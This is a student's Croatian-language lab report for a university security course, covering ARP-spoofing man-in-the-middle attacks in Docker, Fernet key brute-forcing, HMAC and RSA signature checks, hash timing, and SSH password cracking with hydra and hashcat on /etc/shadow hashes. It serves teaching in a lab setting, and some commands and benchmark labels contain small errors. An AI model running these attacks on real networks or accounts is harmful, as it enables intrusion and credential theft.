# Izvještaj laboratorijskih vježbi

Stranica kolegija: [http://marjan.fesb.hr/~mcagalj/SRP](http://marjan.fesb.hr/~mcagalj/SRP)

# 1. Laboratorijska vježba

12.10.2021.

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. 

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container):

- dvije žrtve station-1
- station-2
- napadač evil-station.

## Upoznavanje sa alatima

**Kloniranje repozitorija**

```bash
$ git clone https://github.com/mcagalj/SRP-2021-22
```

**Promjena radnog direktorija**

```bash
$ cd SRP-2021-22/arp-spoofing
```

**Buildanje i pokretanje docker kontejnera**

```bash
$ chmod +X ./start.sh
$ ./start.sh
```

**Zaustavljanje docker kontejnera**

```bash
$ chmod +X ./stop.sh
$ ./stop.sh
```

**Izlist pokrenutih kontejnera**

```bash
$ docker ps
```

```
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
7142ae607cb3   srp/arp   "bash"    4 minutes ago   Up 4 minutes             station-2
c810f9effdb1   srp/arp   "bash"    4 minutes ago   Up 4 minutes             evil-station
cec29037dbe5   srp/arp   "bash"    4 minutes ago   Up 4 minutes             station-1
---------------------------------------------------------------------------------------
```

**Pokretanje interaktivnog shella u `station-1` kontejneru**

```bash
$ docker ps exec -it sh
```

**Dohvaćenje konfiguracije mrežnog interfejsa**

```bash
$ ifconfig -a
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.24.0.2  netmask 255.255.0.0  broadcast 172.24.255.255
        ether 02:42:ac:18:00:02  txqueuelen 0  (Ethernet)
        RX packets 68  bytes 8291 (8.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Informacije koje dobivamo su:

- IP adresa: 172.24.0.2
- adresa mrežnog uređaja:  02:42:ac:18:00:02

**Provjerimo nalazi li se `station-2` na istoj mreži**

```bash
$ ping station-2
```

```
PING station-2 (172.24.0.4) 56(84) bytes of data.
64 bytes from station-2.srp-lab (172.24.0.4): icmp_seq=1 ttl=64 time=0.404 ms
64 bytes from station-2.srp-lab (172.24.0.4): icmp_seq=2 ttl=64 time=0.164 ms
64 bytes from station-2.srp-lab (172.24.0.4): icmp_seq=3 ttl=64 time=0.147 ms
64 bytes from station-2.srp-lab (172.24.0.4): icmp_seq=4 ttl=64 time=0.093 ms
64 bytes from station-2.srp-lab (172.24.0.4): icmp_seq=5 ttl=64 time=0.154 ms
```

**Pokretanje interaktivnog shella u `station-2` kontejneru**

```bash
$ docker exec -it station-2 sh
```

**Na kontejneru `station-1` pomoću netceta otvaramo server TCP socket na portu 9000**

```bash
$ netcat -lp 9000
```

**Na kontejneru `station-2` pomoću netcata otvaramo client TCP socket na hostnameu `statio-1` 9000**

```bash
$ netcat station-1 9000
```

**Pokretanje interaktivnog shella u `evil-station` kontejneru**

```bash
$ docker exec -it evil-station sh
```

## Izvršavanje napada

**U kontejneru `evil-station` pokrećemo arpspoof**

```bash
$ arpspoof -t station-1 station-2
```

**Pokrećemo tcpdump u kontejneru `evil-station` i pratimo promet**

```bash
$ tcpdump
```

**Gasimo prosljeđivanje spoofanih paketa**

```bash
$ echo 0 > /proc/sys/net/ipv4/ip_forward
```

# 2. Laboratorijska vježba

26.10.2021.

Pomoću programskog jezika Python i biblioteke `crypto` koristimo metode enkripcije o kojima smo učili na satu.

Zbog lakšeg *dependency managmenta* koristimo python virtualenvove.

Virtualno okruženje stvaramo komandom `pipenv shell`.

Kreirani su fileovi:

- `Pipfile`  popis paketa
- `Pipfile.lock` popis zakljucanih verzija instaliranih paketa

**Instaliramo paket `cryptography`**

```bash
pipenv install cryptography
```

Prvi koraci sa Fernetom.

```python
from cryptography.fernet import Fernet

PLAINTEXT = b"Hello world"

# generiramo enkripcijski ključ
key = Fernet.generate_key()

# kreiramo instancu Fernet klase
fernet = Fernet(key=key)

# enkriptiramo vrijednost variable PLAINTEXT
ciphertext = fernet.encrypt(PLAINTEXT)

# dekriptiramo ciphertext
deciphertext = fernet.decrypt(ciphertext)

print(f"{ciphertext}\n : \n{deciphertext}")
```

Koristeći poznatu metodu hashiranja, pronalazimo hash stringa `josip_bartulovic`.

Nakon toga unutar foldera pronalazimo file kojem ime odgovara tom hashu.

```python
from cryptography.hazmat.primitives import hashes
import binascii

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

filename = hash('prezime_ime') + ".encrypted"

if __name__ == "__main__":
    print(hash("bartulovic_josip"))
```

Idući zadatak je brute forceom saznati enkripcijski ključ maksimalne entropije 22.

```python
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import InvalidToken, Fernet
import base64
from concurrent.futures import ProcessPoolExecutor, as_completed

def keys(range_from, range_to):
    key = range_from
    print(f"{range_from} - {range_to}")
    while key <= range_to:
        key_bytes = key.to_bytes(32, "big")
        key_base64 = base64.urlsafe_b64encode(key_bytes)
        yield key_base64
        key += 1

def get_file_binary_header(filename="./file.encryption"):
    with open(filename, "rb") as file:
        return file.read()
    

def write_image_to_file(image, filename="./file.encryption.png"):
    with open(filename, "wb") as file:
        file.write(image)

def validate_png_header(png_bin):
    if png_bin[1:4] == b"PNG":
        return True
    return False

def _attack(from_pow, to_pow):
    file_content = get_file_binary_header()

    for index, key in enumerate(keys(from_pow, to_pow)):
        fernet = Fernet(key)

        if index % 1000 == 0:
            print(f"{index} - current - {key}")

        try:
            decypher = fernet.decrypt(file_content)
            if validate_png_header(decypher):
                print("FOUND IT")
                write_image_to_file(decypher)
                return True
        except InvalidToken:
            pass

def paralelize_attack():
    tasks = []
    spreads = [i for i in range(0, 2**22, (2**22)//8+1)]
    with ProcessPoolExecutor(max_workers=100) as executor:
        for spread_index in range(0, len(spreads)-1):
            tasks.append(
                executor.submit(
                    _attack, 
                    spreads[spread_index],
                    spreads[spread_index + 1],
                )
            )

        # prolazimo kroz sve taskove
        # kada prvi task završi cancelamo sve ostale
        for result in as_completed(tasks):
            print("DONE")
            for task in tasks:
                try:
                    task.cancel()
                except Exception:
                    pass

if __name__ == "__main__":
    paralelize_attack()
```

# 3. Laboratorijska vježba

9.11.2021.

## Zadatak 1

Kreirati tekstualnu datoteku zaštićenog integriteta pomoću HMAC mehanizma i Python biblioteke `cryptography`.

## Rješenje

1. Kreiramo file sa porukom koju treba zaštitit. Pročitamo poruku iz filea te je ispisujemo u standardni izlaz.

```python
from cryptography.hazmat.primitives import hashes

def main():
    with open("./message.txt", "rb") as file:
        content = file.read()
        print(content)

if __name__ == "__main__":
    main()
```

1. Kreiramo funkciju za izračun MAC koda. Potrebno je prethodno definirati ključ kojeg koristimo.

```python
from cryptography.hazmat.primitives import hashes, hmac

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature
```

1. Modificiramo `main` funkciju. Kreiramo MAC kod pomoću prethodno definirane funkcije.

```python
def main():
    secret = b"My super secret"
    
    with open("./message.txt", "rb") as file:
        content = file.read()
    
    mac = generate_MAC(secret, content)
    print(mac.hex())
```

1. Zapisujemo generirani MAC u novi file `message.sig`

```python
with open("./message.sig", "wb") as file:
        file.write(mac)
```

1. Kreiramo funkciju za validaciju MAC koda

```python
def is_mac_valid(key, message, mac):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(mac)
    except InvalidSignature:
        return False
    else:
        return True
```

1. U funkciju main dodajemo kod za validaciju MACa 

```python
with open("./message.sig", "rb") as file:
        mac = file.read()

    if is_mac_valid(secret, content, mac):
        print("MEK je validan")
    else:
        print("Zivot je tuga")
```

## Zadatak 2

Downloadamo folder sa MAC challengeovima. U njemu se nalazi 10 teksutalnih fileova sa "nalozima za kupnju dionica". Svaki file ima kreirani MAC. Prilikom slanja poruka netko je narušio njihovu sigurnost. Cilj je odrediti ispravnu sekvenciju transakcija autenticnih poruka. 

Ključ korišten pri kreiranju MACova napravljen je na idući naćin.

```python
key = "<prezime_ime>".encode()t
```

## Rješenje

```python
import os
from pprint import pprint
from datetime import datetime

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import hashes, hmac

def is_mac_valid(key, message, mac):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256(), None)
    h.update(message)
    try:
        h.verify(mac)
    except InvalidSignature:
        return False
    else:
        return True

def read_orders_and_macs(directory):
    orders_and_macs = {}

    for index in range(1, 10):
        order_text_file_route = os.path.join(directory, f"order_{index}.txt")
        order_mac_file_route = os.path.join(directory, f"order_{index}.sig")

        order_text_file = open(order_text_file_route, "rb")
        order_mac_file = open(order_mac_file_route, "rb")

        orders_and_macs[order_text_file.read()] = order_mac_file.read()       

        order_text_file.close()
        order_mac_file.close()

    return orders_and_macs

def extract_order_datetime(order):
    open_bracket_pos = order.index("(") + 1
    close_bracket_pos = order.index(")")

    date_string = order[open_bracket_pos:close_bracket_pos]
    return datetime.strptime(date_string, "%Y-%m-%dT%H:%M")

def main():
    key = "bartulovic_josip".encode()

    orders_and_macs = read_orders_and_macs("mac_challenge")
    valid_orders = []

    for order, mac in orders_and_macs.items():
        if is_mac_valid(key, order, mac):
            valid_orders.append(order.decode("utf-8"))

    sorted_valid_orders = sorted(
        valid_orders,
        key=lambda order: extract_order_datetime(order),
    )

    pprint(sorted_valid_orders)

if __name__ == "__main__":
    main()
```

## Zadatak 3

Zadatak nam je od dvije ponuđene slike odrediti onu koja je autentična.

Svaka slika potpisana je privatnim ključem, a javni ključ je dostupan za download na serveru iz prethodnog zadatka.

Slike i potpis slike (`.sig` file) nalaze sa na serveru na ruti `prezime_ime\public_key_challenge`.

Za rješavanje zadatka koristimo Python biblioteku `cryptography`.

## Rješenje

Koraci pri rješavanju:

1. Učitati prvu sliku `image_1.png`
2. Učitati potpis prve slike `image_1.sig`
3. učitati javni ključ metodom `load_pem_public_key` iz biblioteke `cryptography.hazmat.primitives.serialization`
4. pomoću dobivenog objekta validirati potpis slike
5. Ovisno o validnosti slike i potpisa ispisati odgovarajuću poruku

Isto učiniti za drugu sliku.

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

PUBLIC_KEY_PATH = "./public_key_challenge/public.pem"

def load_public_key():
    with open(PUBLIC_KEY_PATH, "rb") as f:
        public_key = serialization.load_pem_public_key(
            data=f.read(),
            backend=default_backend(),
        )
        return public_key

def verify_signature_rsa(signature, message):
    PUBLIC_KEY = load_public_key()
    try:
        PUBLIC_KEY.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256(),
        )
    except InvalidSignature:
        return False
    else:
        return True

signature1 = open("./public_key_challenge/image_1.sig", "rb")
image1 = open("./public_key_challenge/image_1.png", "rb")
if verify_signature_rsa(signature1.read(), image1.read()):
    print("Image 1 is AUTHENTIC")
else:
    print("Image 1 is NOT AUTHENTIC")
signature1.close()
image1.close()

signature2 = open("./public_key_challenge/image_2.sig", "rb")
image2 = open("./public_key_challenge/image_2.png", "rb")
if verify_signature_rsa(signature2.read(), image2.read()):
    print("Image 2 is AUTHENTIC")
else:
    print("Image 2 is NOT AUTHENTIC")
signature2.close()
image2.close()
```

# 4. Laboratorijska vježba

7.12.2021

Na ovoj vježbi upoznat ćemo se sa metodama zaštite podataka prilikom njihove pohrane.

Pet različitih hash funkcija pokrenit ćemo nad istim skupom podataka 100 puta te pomoću prosjećnog vremena izvođenja funkcije usporediti utjecaj prosječnog vremena izvođenja pojedine funkcije na sigurnost podataka u slučaju brute-force napada.

Na pojedinim funkcija primjenit ćemo metode iterativnog i memory-hard hashiranja.

Funkcije koje koristimo su:

- HASH_MD5
- HASH_SHA256
- AES
- Linux CRPYT 5k rounds
- Linux CRYPT 10k rounds

Rezultati dobiveni iz eksperimenta:

| Function | Avg. Time (100 runs) |
| --- | --- |
| HASH_MD5 | 3.3e-05 |
| HASH_SHA256 | 3.4e-05 |
| AES | 0.000368 |
| Linux CRYPT 5k rounds | 0.006213 |
| Linux CRYPT 10k rounds | 0.010228 |

Zaključujemo da što više iterativnih heširanja primjenimo nad istim podatkom to će brute forceanje datih podataka biti teže.

Primjerice ako imamo dictionary od 10 000 razlicitih mogućih šifri, a šifre pohranjenje u našoj bazi su iterativno hashirane Linux CRYPT algoritmom 10 000 puta, za proći kroz cijelu biblioteku trebat će nam 0.010228 * 10000s = 102.28 s to jest 1.5 min.

A ako iterativno hashiramo Linux CRYPT algoritmom 5 000 puta trebat će nam 0.85min.

❗ Prilikom odabira algoritma i broja iteracija potrebno je odvagati važnost “user experienca” i sigurnosti podataka. Što više puta iterativno hashiramo korisnikovu šifru, to će prilikom autentikacije korisnika on trebat dulje čekati da bi dobio potvrdu o prijavi.

```python
from os import urandom
from prettytable import PrettyTable
from timeit import default_timer as time
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from passlib.hash import sha512_crypt, pbkdf2_sha256, argon2

def time_it(function):
    def wrapper(*args, **kwargs):
        start_time = time()
        result = function(*args, **kwargs)
        end_time = time()
        measure = kwargs.get("measure")
        if measure:
            execution_time = end_time - start_time
            return result, execution_time
        return result
    return wrapper

@time_it
def aes(**kwargs):
    key = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    ])

    plaintext = bytes([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ])

    encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    encryptor.update(plaintext)
    encryptor.finalize()

@time_it
def md5(input, **kwargs):
    digest = hashes.Hash(hashes.MD5(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def sha256(input, **kwargs):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def sha512(input, **kwargs):
    digest = hashes.Hash(hashes.SHA512(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()

@time_it
def pbkdf2(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"12QIp/Kd"
    rounds = kwargs.get("rounds", 10000)
    return pbkdf2_sha256.hash(input, salt=salt, rounds=rounds)

@time_it
def argon2_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"0"*22
    rounds = kwargs.get("rounds", 12)              # time_cost
    memory_cost = kwargs.get("memory_cost", 2**10) # kibibytes
    parallelism = kwargs.get("rounds", 1)
    return argon2.using(
        salt=salt,
        rounds=rounds,
        memory_cost=memory_cost,
        parallelism=parallelism
    ).hash(input)

@time_it
def linux_hash_6(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = "12QIp/Kd"
    return sha512_crypt.hash(input, salt=salt, rounds=5000)

@time_it
def linux_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = kwargs.get("salt")
    rounds = kwargs.get("rounds", 5000)
    if salt:
        return sha512_crypt.hash(input, salt=salt, rounds=rounds)
    return sha512_crypt.hash(input, rounds=rounds)

@time_it
def scrypt_hash(input, **kwargs):
    salt = kwargs.get("salt", urandom(16))
    length = kwargs.get("length", 32)
    n = kwargs.get("n", 2**14)
    r = kwargs.get("r", 8)
    p = kwargs.get("p", 1)
    kdf = Scrypt(
        salt=salt,
        length=length,
        n=n,
        r=r,
        p=p
    )
    hash = kdf.derive(input)
    return {
        "hash": hash,
        "salt": salt
    }

if __name__ == "__main__":
    ITERATIONS = 100
    password = b"super secret password"

    MEMORY_HARD_TESTS = []
    LOW_MEMORY_TESTS = []

    TESTS = [
        {
            "name": "AES",
            "service": lambda: aes(measure=True)
        },
        {
            "name": "HASH_MD5",
            "service": lambda: sha512(password, measure=True)
        },
        {
            "name": "HASH_SHA256",
            "service": lambda: sha512(password, measure=True)
        }
    ]

    table = PrettyTable()
    column_1 = "Function"
    column_2 = f"Avg. Time ({ITERATIONS} runs)"
    table.field_names = [column_1, column_2]
    table.align[column_1] = "l"
    table.align[column_2] = "c"
    table.sortby = column_2

    for test in TESTS:
        name = test.get("name")
        service = test.get("service")

        total_time = 0
        for iteration in range(0, ITERATIONS):
            print(f"Testing {name:>6} {iteration}/{ITERATIONS}", end="\r")
            _, execution_time = service()
            total_time += execution_time
        average_time = round(total_time/ITERATIONS, 6)
        table.add_row([name, average_time])
        print(f"{table}\n\n")
```

# 5. Laboratorijska vježba

21.12.2021

## Online password guessing

Koristeći alat `nmap` skeniramo mrežnu masku `10.0.15.0/28` i dobivamo izlist otvorenih portova na pojedinim ip adresama pokrivenim mrežnom maskom.

```
Nmap (“Network Mapper”) is an open source tool for network exploration
       and security auditing. It was designed to rapidly scan large networks,
       although it works fine against single hosts. Nmap uses raw IP packets
       in novel ways to determine what hosts are available on the network,
       what services (application name and version) those hosts are offering,
       what operating systems (and OS versions) they are running, what type of
       packet filters/firewalls are in use, and dozens of other
       characteristics. While Nmap is commonly used for security audits, many
       systems and network administrators find it useful for routine tasks
       such as network inventory, managing service upgrade schedules, and
       monitoring host or service uptime.
```

To činimo pomoću komande

```bash
nmap -v 10.0.15.0/28
```

Pronalazimo otvoren ssh port na serveru `10.0.15.1`. Saznajemo da je username na serveru koji se vrti unutar docker containera jednak `<prezime_ucenika>_<ime_ucenika>`. Jedino sto nam sada fali da bi dobili ssh pristup mašini je korisnička šifra.

Za to koristimo alat pod imenom `hydra`pomoću kojeg ćemo izvest **online password guessing attack**.

```
Hydra is a parallelized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that,
       it is flexible and very fast.

       This tool gives researchers and security consultants the possibility to show how easy it would be to gain  unauthorized  ac‐
       cess from remote to a system.
```

Uz pretpostavku da je šifra duljine 4-6 slova i sadrži samo mala slova engleske abecede napad pokrećemo pomoću komande.

```bash
# hydra -l <username> -x 4:6:a <your IP address> -V -t 1 ssh

hydra -l bartulovic_josip -x 4:6:a 10.0.15.1 -V -t 1 ssh
```

Password space ovakve šifre je veličine $26^4 + 26^5 + 26^6 \approx 3*10^8$.

Zbog brzine provjeravanja pojedine šifre ssh tunela ovakav pristup probivanju šifre jako je neučinkovit.

Zbog toga je potrebno smanjit password space koristeći rječnik šifri sastavljen iz prethodnog password spacea za koje je najvjerojatnije da ih netko iskoristi.

Rječnik nalazimo na serveru [http://a507-server.local:8080/](http://a507-server.local:8080/) i downloadamo ga komandom:

```bash
# For GROUP 1 (g1)
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g4/
```

Napad pomoću rječnika pokrećemo komandom:

```bash
# hydra -l <username> -P dictionary/<group ID>/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
hydra -l bartulovic_josip -P dictionary/g4/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
```

**Pronađena šifra glasi: `ouriom`**

## Offline password guessing

Pomoću pronađene šifre prijavljujemo se na server. Otkrivamo da računalo u koje smo provalili ima nekoliko različitih korisnika čiji se hashevi šifra nalaze u dokumentu `etc/shadow`.

Odabiremo jednog korisnika i preuzimamo njegov password hash.

Koristeći alat `hashcat` pokrećeno offline password guessing attack.

```
Hashcat is the world’s fastest CPU-based password recovery tool.

While it's not as fast as its GPU counterpart oclHashcat, large 
lists can be easily split in half with a good dictionary and a bit 
of knowledge of the command switches.
```

Poznato nam je da je šifra duljina 6 znakova i sastavljena je od samo malih slova engleske abecede.

```bash
# hashcat --force -m 1800 -a 3 <password_hash_file> ?l?l?l?l?l?l --status --status-timer 10
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

Ovakav napad puno se brže se izvršava od online password napada bez korištenja rječnika i moguće ga je izvršit u realnom vremenu.

Međutim ako ga želimo dodatno ubrzat možemo ponovno preuzet rječnik sa mogućim šiframa i pomoću hashcata otkriti koji niz znakova je točno hashiran.

```bash
# hashcat --force -m 1800 -a 0 <password_hash_file> <dictionary_file> --status --status-timer 10
hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
```
